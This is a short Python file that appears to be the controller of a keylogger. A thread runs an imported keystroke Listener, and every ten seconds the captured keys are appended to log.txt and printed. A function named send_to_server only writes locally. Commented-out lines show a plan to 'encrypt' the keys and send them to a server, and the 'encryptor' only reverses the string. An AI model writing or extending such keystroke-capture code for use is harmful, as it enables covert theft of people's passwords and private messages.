import threading
from time import sleep
from log_creator import create_log

from listener import Listener

class Manager:
    def __init__(self):
        self.listener = Listener()
        self.process = threading.Thread(target=self.listener.run)
    def start(self):
        self.process.start()
        # a = self.listener.get_keys()
            # e = encryptor(a)
            # send_to_server(e)
        # send_to_server(a)
    def stop(self):
        self.listener.stop()

def encryptor(data):
    return str((data[::-1]))

def send_to_server(data):
    if data:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(f'{create_log(data)}\n')

if __name__ == '__main__':

    p = Manager()
    p.start()
    while 1:
        sleep(10)
        t = p.listener.get_keys()
        send_to_server(t)
        if t:
            print(create_log(t))
